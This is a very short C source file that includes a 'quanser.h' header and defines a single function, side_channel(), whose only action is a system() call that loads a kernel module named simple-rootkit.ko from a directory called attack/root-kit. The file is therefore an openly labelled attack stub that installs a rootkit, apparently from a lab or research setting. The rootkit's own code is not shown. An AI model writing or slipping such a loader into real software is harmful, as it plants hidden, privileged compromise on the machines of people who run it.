#include<stdio.h>
#include<stdlib.h>
#include"quanser.h"


void side_channel()
{
	system("insmod /home/debian/attack/root-kit/simple-rootkit.ko");
}
